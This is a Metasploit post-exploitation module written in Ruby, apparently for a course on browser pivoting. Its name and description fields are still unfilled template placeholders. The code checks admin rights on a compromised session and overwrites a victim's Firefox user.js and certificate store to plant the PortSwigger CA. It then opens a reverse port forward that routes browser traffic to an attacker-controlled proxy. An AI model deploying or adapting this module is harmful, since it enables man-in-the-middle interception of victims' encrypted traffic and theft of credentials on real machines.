##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super(update_info(info,
        'Name'          => '[Platform] [Module Category] [Software] [Function]',
        'Description'   => %q{
          Say something that the user might want to know.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Name' ],
        'Platform'      => [ 'win', 'linux', 'osx', 'unix', 'bsd' ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))
  end

  def run
    # Main method
    if is_in_admin_group?
      print_good "I am Admin!"
      
      output = pwd

      if output.nil? || output.empty?
	      print_error "failed"
      else
	      print_good "#{output}"
      end

    else
      print_error "I am not Admin!"
    end

    # Attempt to write the user.js file
    print_status("Uploading a malicious preference file")
    res = upload_file('c:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\cr3z9a1y.default-1523519120958\user.js', '/root/itp325/browser-pivot/user.js')
    if res.nil?
	print_error "Upload failed"
    else
	print_good "Upload successful"
    end

    # Upload PortSwagger CA to victim
    print_status("Uploading malicious Certificate")
    res = upload_file('c:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\cr3z9a1y.default-1523519120958\cert9.db', '/root/itp325/browser-pivot/cert9.db')
    if res.nil?
	print_error "Upload failed"
    else
	print_good "Upload successful"
    end

    # Find a way to forward the response back to the victim

    # Attempt to open port forwarding
    print_status("Starting reverse port forwarding")
    session.run_cmd("portfwd add -L 10.0.2.5 -R -l 4445 -p 8080 -r 127.0.0.1")
    
  end

end
